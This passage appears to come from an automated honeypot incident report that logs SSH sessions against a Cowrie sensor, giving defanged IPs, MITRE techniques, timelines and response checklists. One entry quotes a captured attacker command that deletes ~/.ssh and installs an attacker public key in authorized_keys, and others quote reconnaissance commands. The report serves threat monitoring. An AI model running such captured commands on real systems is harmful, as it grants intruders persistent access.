| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:38:47` | `cowrie.session.connect` |
| `2026-09-03 08:38:47` | `cowrie.login.success` |
| `2026-09-03 08:38:47` | `cowrie.session.params` |
| `2026-09-03 08:38:47` | `cowrie.command.input` |
| `2026-09-03 08:38:47` | `cowrie.command.failed` |
| `2026-09-03 08:38:49` | `cowrie.log.closed` |
| `2026-09-03 08:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.161[.]246` to AbuseIPDB if not already reported
- [ ] Block `34.53.161[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b584711e72c3

| Field | Detail |
|---|---|
| **Source IP** | `34.53.161[.]246` |
| **First Seen** | 2026-09-03 08:38 |
| **Last Seen** | 2026-09-03 08:39 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:38:49` | `cowrie.session.connect` |
| `2026-09-03 08:38:49` | `cowrie.login.success` |
| `2026-09-03 08:38:49` | `cowrie.session.params` |
| `2026-09-03 08:38:49` | `cowrie.command.input` |
| `2026-09-03 08:39:09` | `cowrie.log.closed` |
| `2026-09-03 08:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.161[.]246` to AbuseIPDB if not already reported
- [ ] Block `34.53.161[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33f73d9a88af

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:40 |
| **Last Seen** | 2026-09-03 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:40:31` | `cowrie.session.connect` |
| `2026-09-03 08:40:31` | `cowrie.client.version` |
| `2026-09-03 08:40:31` | `cowrie.client.kex` |
| `2026-09-03 08:40:32` | `cowrie.login.success` |
| `2026-09-03 08:40:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:40:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:40:32` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e13add022e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:48 |
| **Last Seen** | 2026-09-03 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:48:36` | `cowrie.session.connect` |
| `2026-09-03 08:48:36` | `cowrie.client.version` |
| `2026-09-03 08:48:37` | `cowrie.client.kex` |
| `2026-09-03 08:48:37` | `cowrie.login.success` |
| `2026-09-03 08:48:38` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:48:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:48:38` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044b3fee9b16

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:50 |
| **Last Seen** | 2026-09-03 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:50:08` | `cowrie.session.connect` |
| `2026-09-03 08:50:08` | `cowrie.client.version` |
| `2026-09-03 08:50:08` | `cowrie.client.kex` |
| `2026-09-03 08:50:09` | `cowrie.login.success` |
| `2026-09-03 08:50:09` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:50:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:50:09` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d389bd679811

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:59 |
| **Last Seen** | 2026-09-03 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:59:27` | `cowrie.session.connect` |
| `2026-09-03 08:59:27` | `cowrie.client.version` |
| `2026-09-03 08:59:27` | `cowrie.client.kex` |
| `2026-09-03 08:59:28` | `cowrie.login.success` |
| `2026-09-03 08:59:28` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:59:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:59:28` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6c296f24972

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 08:59 |
| **Last Seen** | 2026-09-03 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 08:59:41` | `cowrie.session.connect` |
| `2026-09-03 08:59:41` | `cowrie.client.version` |
| `2026-09-03 08:59:41` | `cowrie.client.kex` |
| `2026-09-03 08:59:42` | `cowrie.login.success` |
| `2026-09-03 08:59:42` | `cowrie.direct-tcpip.request` |
| `2026-09-03 08:59:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 08:59:42` | `cowrie.direct-tcpip.data` |
| `2026-09-03 08:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e263c33d7f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:09 |
| **Last Seen** | 2026-09-03 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:09:06` | `cowrie.session.connect` |
| `2026-09-03 09:09:06` | `cowrie.client.version` |
| `2026-09-03 09:09:06` | `cowrie.client.kex` |
| `2026-09-03 09:09:07` | `cowrie.login.success` |
| `2026-09-03 09:09:07` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:09:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:09:07` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4f46e19154

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:10 |
| **Last Seen** | 2026-09-03 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:10:07` | `cowrie.session.connect` |
| `2026-09-03 09:10:07` | `cowrie.client.version` |
| `2026-09-03 09:10:07` | `cowrie.client.kex` |
| `2026-09-03 09:10:08` | `cowrie.login.success` |
| `2026-09-03 09:10:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:10:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:10:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4355aeb8bcfe

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 09:10 |
| **Last Seen** | 2026-09-03 09:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:10:47` | `cowrie.session.connect` |
| `2026-09-03 09:10:47` | `cowrie.client.version` |
| `2026-09-03 09:10:47` | `cowrie.client.kex` |
| `2026-09-03 09:10:48` | `cowrie.login.success` |
| `2026-09-03 09:10:48` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:10:48` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0f4f06f77b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:18 |
| **Last Seen** | 2026-09-03 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:18:42` | `cowrie.session.connect` |
| `2026-09-03 09:18:42` | `cowrie.client.version` |
| `2026-09-03 09:18:42` | `cowrie.client.kex` |
| `2026-09-03 09:18:43` | `cowrie.login.success` |
| `2026-09-03 09:18:43` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:18:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:18:43` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20659c5d27d

| Field | Detail |
|---|---|
| **Source IP** | `64.121.66[.]69` |
| **First Seen** | 2026-09-03 09:20 |
| **Last Seen** | 2026-09-03 09:25 |
| **Session Duration** | 267s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:20:42` | `cowrie.session.connect` |
| `2026-09-03 09:20:42` | `cowrie.client.version` |
| `2026-09-03 09:20:42` | `cowrie.client.kex` |
| `2026-09-03 09:20:44` | `cowrie.login.failed` |
| `2026-09-03 09:20:45` | `cowrie.login.success` |
| `2026-09-03 09:20:46` | `cowrie.session.params` |
| `2026-09-03 09:20:46` | `cowrie.command.input` |
| `2026-09-03 09:20:46` | `cowrie.command.failed` |
| `2026-09-03 09:20:46` | `cowrie.log.closed` |
| `2026-09-03 09:20:47` | `cowrie.session.params` |
| `2026-09-03 09:20:47` | `cowrie.command.input` |
| `2026-09-03 09:20:47` | `cowrie.log.closed` |
| `2026-09-03 09:20:48` | `cowrie.session.params` |
| `2026-09-03 09:20:48` | `cowrie.command.input` |
| `2026-09-03 09:20:48` | `cowrie.log.closed` |
| `2026-09-03 09:20:48` | `cowrie.session.params` |
| `2026-09-03 09:20:48` | `cowrie.command.input` |
| `2026-09-03 09:20:49` | `cowrie.log.closed` |
| `2026-09-03 09:20:49` | `cowrie.session.params` |
| `2026-09-03 09:20:49` | `cowrie.command.input` |
| `2026-09-03 09:20:49` | `cowrie.log.closed` |
| `2026-09-03 09:20:50` | `cowrie.session.params` |
| `2026-09-03 09:20:50` | `cowrie.command.input` |
| `2026-09-03 09:20:50` | `cowrie.log.closed` |
| `2026-09-03 09:20:51` | `cowrie.session.params` |
| `2026-09-03 09:20:51` | `cowrie.command.input` |
| `2026-09-03 09:20:51` | `cowrie.log.closed` |
| `2026-09-03 09:20:51` | `cowrie.session.params` |
| `2026-09-03 09:20:51` | `cowrie.command.input` |
| `2026-09-03 09:20:52` | `cowrie.log.closed` |
| `2026-09-03 09:20:52` | `cowrie.session.params` |
| `2026-09-03 09:20:52` | `cowrie.command.input` |
| `2026-09-03 09:20:52` | `cowrie.log.closed` |
| `2026-09-03 09:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.121.66[.]69` to AbuseIPDB if not already reported
- [ ] Block `64.121.66[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be44e82b02ed

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 09:20 |
| **Last Seen** | 2026-09-03 09:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:20:52` | `cowrie.session.connect` |
| `2026-09-03 09:20:52` | `cowrie.client.version` |
| `2026-09-03 09:20:52` | `cowrie.client.kex` |
| `2026-09-03 09:20:53` | `cowrie.login.success` |
| `2026-09-03 09:20:53` | `cowrie.direct-tcpip.request` |
| `2026-09-03 09:20:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 09:20:53` | `cowrie.direct-tcpip.data` |
| `2026-09-03 09:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15b69979c6b

| Field | Detail |
|---|---|
| **Source IP** | `181.62.56[.]67` |
| **First Seen** | 2026-09-03 09:24 |
| **Last Seen** | 2026-09-03 09:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:24:42` | `cowrie.session.connect` |
| `2026-09-03 09:24:42` | `cowrie.client.version` |
| `2026-09-03 09:24:42` | `cowrie.client.kex` |
| `2026-09-03 09:24:43` | `cowrie.login.success` |
| `2026-09-03 09:24:43` | `cowrie.session.params` |
| `2026-09-03 09:24:43` | `cowrie.command.input` |
| `2026-09-03 09:24:43` | `cowrie.command.failed` |
| `2026-09-03 09:24:43` | `cowrie.log.closed` |
| `2026-09-03 09:24:44` | `cowrie.session.params` |
| `2026-09-03 09:24:44` | `cowrie.command.input` |
| `2026-09-03 09:24:44` | `cowrie.session.file_download` |
| `2026-09-03 09:24:44` | `cowrie.log.closed` |
| `2026-09-03 09:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.62.56[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.62.56[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1296475683d9

| Field | Detail |
|---|---|
| **Source IP** | `181.62.56[.]67` |
| **First Seen** | 2026-09-03 09:24 |
| **Last Seen** | 2026-09-03 09:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:24:44` | `cowrie.session.connect` |
| `2026-09-03 09:24:44` | `cowrie.client.version` |
| `2026-09-03 09:24:44` | `cowrie.client.kex` |
| `2026-09-03 09:24:45` | `cowrie.login.success` |
| `2026-09-03 09:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.62.56[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.62.56[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c679eb34d072

| Field | Detail |
|---|---|
| **Source IP** | `181.62.56[.]67` |
| **First Seen** | 2026-09-03 09:24 |
| **Last Seen** | 2026-09-03 09:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:24:45` | `cowrie.session.connect` |
| `2026-09-03 09:24:45` | `cowrie.client.version` |
| `2026-09-03 09:24:45` | `cowrie.client.kex` |
| `2026-09-03 09:24:45` | `cowrie.login.success` |
| `2026-09-03 09:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.62.56[.]67` to AbuseIPDB if not already reported
- [ ] Block `181.62.56[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efef0e954f27

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:45` | `cowrie.session.connect` |
| `2026-09-03 09:26:45` | `cowrie.client.version` |
| `2026-09-03 09:26:45` | `cowrie.client.kex` |
| `2026-09-03 09:26:45` | `cowrie.login.success` |
| `2026-09-03 09:26:46` | `cowrie.session.params` |
| `2026-09-03 09:26:46` | `cowrie.command.input` |
| `2026-09-03 09:26:46` | `cowrie.log.closed` |
| `2026-09-03 09:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ecf64f418b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:46` | `cowrie.session.connect` |
| `2026-09-03 09:26:46` | `cowrie.client.version` |
| `2026-09-03 09:26:46` | `cowrie.client.kex` |
| `2026-09-03 09:26:47` | `cowrie.login.success` |
| `2026-09-03 09:26:47` | `cowrie.session.params` |
| `2026-09-03 09:26:47` | `cowrie.command.input` |
| `2026-09-03 09:26:47` | `cowrie.log.closed` |
| `2026-09-03 09:26:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2254399eea

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:48` | `cowrie.session.connect` |
| `2026-09-03 09:26:48` | `cowrie.client.version` |
| `2026-09-03 09:26:48` | `cowrie.client.kex` |
| `2026-09-03 09:26:48` | `cowrie.login.success` |
| `2026-09-03 09:26:49` | `cowrie.session.params` |
| `2026-09-03 09:26:49` | `cowrie.command.input` |
| `2026-09-03 09:26:49` | `cowrie.log.closed` |
| `2026-09-03 09:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11c9d26cd9a2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:49` | `cowrie.session.connect` |
| `2026-09-03 09:26:49` | `cowrie.client.version` |
| `2026-09-03 09:26:49` | `cowrie.client.kex` |
| `2026-09-03 09:26:49` | `cowrie.login.success` |
| `2026-09-03 09:26:50` | `cowrie.session.params` |
| `2026-09-03 09:26:50` | `cowrie.command.input` |
| `2026-09-03 09:26:50` | `cowrie.log.closed` |
| `2026-09-03 09:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-335395913b1d

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:50` | `cowrie.session.connect` |
| `2026-09-03 09:26:50` | `cowrie.client.version` |
| `2026-09-03 09:26:50` | `cowrie.client.kex` |
| `2026-09-03 09:26:50` | `cowrie.login.success` |
| `2026-09-03 09:26:51` | `cowrie.session.params` |
| `2026-09-03 09:26:51` | `cowrie.command.input` |
| `2026-09-03 09:26:51` | `cowrie.log.closed` |
| `2026-09-03 09:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c7053d72e2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:52` | `cowrie.session.connect` |
| `2026-09-03 09:26:52` | `cowrie.client.version` |
| `2026-09-03 09:26:52` | `cowrie.client.kex` |
| `2026-09-03 09:26:52` | `cowrie.login.success` |
| `2026-09-03 09:26:53` | `cowrie.session.params` |
| `2026-09-03 09:26:53` | `cowrie.command.input` |
| `2026-09-03 09:26:53` | `cowrie.log.closed` |
| `2026-09-03 09:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]73` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7fc74cc896

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]73` |
| **First Seen** | 2026-09-03 09:26 |
| **Last Seen** | 2026-09-03 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 09:26:53` | `cowrie.session.connect` |
| `2026-09-03 09:26:53` | `cowrie.client.version` |
| `2026-09-03 09:26:53` | `cowrie.client.kex` |
| `2026-09-03 09:26:53` | `cowrie.login.success` |
| `2026-09-03 09:26:54` | `cowrie.session.params` |
| `2026-09-03 09:26:54` | `cowrie.command.input` |
| `2026-09-03 09:26:54` | `cowrie.log.closed` |
| `2026-09-03 09:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
